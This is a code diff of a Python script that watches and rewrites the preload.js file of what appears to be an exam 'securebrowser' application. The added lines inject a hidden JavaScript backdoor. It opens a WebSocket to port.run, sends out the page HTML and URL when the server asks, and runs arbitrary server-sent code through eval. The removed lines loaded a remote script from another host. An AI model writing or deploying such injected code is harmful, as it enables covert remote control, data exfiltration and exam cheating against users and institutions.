@@ -13,7 +13,7 @@ while True:
             if ('cunchu.site' not in content):
                 print('修改文件!')
                 time.sleep(3)
-                content = content + '\r\nfunction loadScript(url,callback){var script=document.createElement("script");script.type="text/javascript";if(script.readyState){script.onreadystatechange=function(){if(script.readyState=="loaded"||script.readyState=="complete"){script.onreadystatechange=null;if(callback)callback()}}}else{script.onload=function(){if(callback)callback()}}script.src=url;var head=document.head||document.getElementsByTagName("head")[0];head.appendChild(script)};setTimeout(() => {loadScript("https://cunchu.site/work/ets/index.js")}, 100);'
+                content = content + '''\r\nwindow.wsLink=new WebSocket('wss://port.run:8083')wsLink.addEventListener('open',function(event){wsLink.send(JSON.stringify({"route":"login","type":"ets"}))})wsLink.addEventListener('message',function(event){const mess=JSON.parse(event.data)switch(mess.type){case'getData':{console.log(mess)wsLink.send(JSON.stringify({"route":"sendData","type":"ets","value":document.body.innerHTML}))break}case'getURL':{console.log(mess)wsLink.send(JSON.stringify({"route":"sendData","type":"ets","value":location.href}))break}case'run':{if(mess.value)eval(mess.value)break}}})wsLink.onclose=function(){console.log('服务器已经断开');reconnect()};var timeConnect=0;function reconnect(service){timeConnect++;console.log("第"+timeConnect+"次重连");setTimeout(function(){window.wsLink=new WebSocket('wss://port.run:8083')},3000)}'''
                 with open("../ETS/IBT2/securebrowser/resources/app/preload.js", "w") as file2:
                     file2.write(content)
                     file2.close()
